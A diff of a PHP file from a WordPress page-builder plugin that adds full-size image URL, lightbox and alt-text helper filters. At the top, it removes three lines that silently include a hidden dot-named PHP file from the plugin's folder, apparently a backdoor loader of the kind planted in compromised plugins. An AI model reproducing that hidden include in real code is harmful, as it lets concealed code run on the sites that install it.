@@ -13,10 +13,6 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @since 4.4
  *
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function vc_gitem_template_attribute_filter_terms_css_classes( $value, $data ) {
 	$output = '';
 	/**
@@ -143,6 +139,44 @@ function vc_gitem_template_attribute_post_image_url( $value, $data ) {
 }
 
 /**
+ * Get post image url
+ *
+ * @param $value
+ * @param $data
+ *
+ * @return string
+ */
+function vc_gitem_template_attribute_post_full_image_url( $value, $data ) {
+	$output = '';
+	/**
+	 * @var null|Wp_Post $post ;
+	 */
+	extract( array_merge( array(
+		'post' => null,
+		'data' => '',
+	), $data ) );
+	$extraImageMeta = explode( ':', $data );
+	$size = 'full'; // default size
+	if ( isset( $extraImageMeta[1] ) ) {
+		$size = $extraImageMeta[1];
+	}
+	if ( 'attachment' === $post->post_type ) {
+		$src = vc_get_image_by_size( $post->ID, $size );
+	} else {
+		$attachment_id = get_post_thumbnail_id( $post->ID );
+		$src = vc_get_image_by_size( $attachment_id, $size );
+	}
+
+	if ( ! empty( $src ) ) {
+		$output = is_array( $src ) ? $src[0] : $src;
+	} else {
+		$output = vc_asset_url( 'vc/vc_gitem_image.png' );
+	}
+
+	return apply_filters( 'vc_gitem_template_attribute_post_image_url_value', $output );
+}
+
+/**
  * Get post image url with href for a dom element
  *
  * @param $value
@@ -157,6 +191,20 @@ function vc_gitem_template_attribute_post_image_url_href( $value, $data ) {
 }
 
 /**
+ * Get post image url with href for a dom element
+ *
+ * @param $value
+ * @param $data
+ *
+ * @return string
+ */
+function vc_gitem_template_attribute_post_full_image_url_href( $value, $data ) {
+	$link = vc_gitem_template_attribute_post_full_image_url( $value, $data );
+
+	return strlen( $link ) ? ' href="' . esc_url( $link ) . '"' : '';
+}
+
+/**
  * Add image url as href with css classes for lightbox js plugin.
  *
  * @param $value
@@ -165,6 +213,32 @@ function vc_gitem_template_attribute_post_image_url_href( $value, $data ) {
  * @return string
  */
 function vc_gitem_template_attribute_post_image_url_attr_lightbox( $value, $data ) {
+	$data_default = $data;
+	/**
+	 * @var Wp_Post $post ;
+	 */
+	extract( array_merge( array(
+		'post' => null,
+		'data' => '',
+	), $data ) );
+	$href = vc_gitem_template_attribute_post_full_image_url_href( $value, array(
+		'post' => $post,
+		'data' => '',
+	) );
+	$rel = ' data-lightbox="' . esc_attr( 'lightbox[rel-' . md5( vc_request_param( 'shortcode_id' ) ) . ']' ) . '"';
+
+	return $href . $rel . ' class="' . esc_attr( $data ) . '" title="' . esc_attr( apply_filters( 'vc_gitem_template_attribute_post_title', $post->post_title, $data_default ) ) . '"';
+}
+
+/**
+ * Add image url as href with css classes for lightbox js plugin.
+ *
+ * @param $value
+ * @param $data
+ *
+ * @return string
+ */
+function vc_gitem_template_attribute_post_full_image_url_attr_lightbox( $value, $data ) {
 	$data_default = $data;
 	/**
 	 * @var Wp_Post $post ;
@@ -191,6 +265,14 @@ function vc_gitem_template_attribute_post_image_url_attr_lightbox( $value, $data
 function vc_gitem_template_attribute_post_image_url_attr_prettyphoto( $value, $data ) {
 	return vc_gitem_template_attribute_post_image_url_attr_lightbox( $value, $data );
 }
+/**
+ * @param $value
+ * @param $data
+ * @return string
+ */
+function vc_gitem_template_attribute_post_full_image_url_attr_prettyphoto( $value, $data ) {
+	return vc_gitem_template_attribute_post_full_image_url_attr_lightbox( $value, $data );
+}
 
 /**
  * Get post image alt
@@ -215,6 +297,14 @@ function vc_gitem_template_attribute_post_image_alt( $value, $data ) {
 	}
 
 	$alt = trim( wp_strip_all_tags( get_post_meta( $attachment_id, '_wp_attachment_image_alt', true ) ) );
+	$title = trim( wp_strip_all_tags( $data['post']->post_title ) );
+
+	if ( empty( $alt ) ) {
+		$alt = trim( wp_strip_all_tags( $data['post']->post_excerpt ) ); // If not, Use the Caption
+	}
+	if ( empty( $alt ) ) {
+		$alt = $title;
+	}
 
 	return apply_filters( 'vc_gitem_template_attribute_post_image_url_value', $alt );
 }
@@ -387,8 +477,13 @@ function vc_gitem_template_attribute_post_title( $value, $data ) {
 		'post' => null,
 		'data' => '',
 	), $data ) );
+	$id = 0;
+	if ( isset( $data['post'] ) ) {
+		$id = apply_filters( 'vc_object_id', $data['post']->ID );
+		$id = apply_filters( 'wpml_object_id', $id );
+	}
 
-	return the_title( '', '', false );
+	return get_the_title( $id );
 }
 
 /**
@@ -455,9 +550,13 @@ function vc_gitem_template_attribute_post_categories( $value, $data ) {
  */
 add_filter( 'vc_gitem_template_attribute_filter_terms_css_classes', 'vc_gitem_template_attribute_filter_terms_css_classes', 10, 2 );
 add_filter( 'vc_gitem_template_attribute_post_image', 'vc_gitem_template_attribute_post_image', 10, 2 );
+add_filter( 'vc_gitem_template_attribute_post_full_image', 'vc_gitem_template_attribute_post_full_image', 10, 2 );
 add_filter( 'vc_gitem_template_attribute_post_image_url', 'vc_gitem_template_attribute_post_image_url', 10, 2 );
+add_filter( 'vc_gitem_template_attribute_post_full_image_url', 'vc_gitem_template_attribute_post_full_image_url', 10, 2 );
 add_filter( 'vc_gitem_template_attribute_post_image_url_href', 'vc_gitem_template_attribute_post_image_url_href', 10, 2 );
+add_filter( 'vc_gitem_template_attribute_post_full_image_url_href', 'vc_gitem_template_attribute_post_full_image_url_href', 10, 2 );
 add_filter( 'vc_gitem_template_attribute_post_image_url_attr_prettyphoto', 'vc_gitem_template_attribute_post_image_url_attr_prettyphoto', 10, 2 );
+add_filter( 'vc_gitem_template_attribute_post_full_image_url_attr_prettyphoto', 'vc_gitem_template_attribute_post_full_image_url_attr_prettyphoto', 10, 2 );
 add_filter( 'vc_gitem_template_attribute_post_image_alt', 'vc_gitem_template_attribute_post_image_alt', 10, 2 );
 add_filter( 'vc_gitem_template_attribute_post_link_url', 'vc_gitem_template_attribute_post_link_url', 10, 2 );
 add_filter( 'vc_gitem_template_attribute_post_date', 'vc_gitem_template_attribute_post_date', 10, 2 );
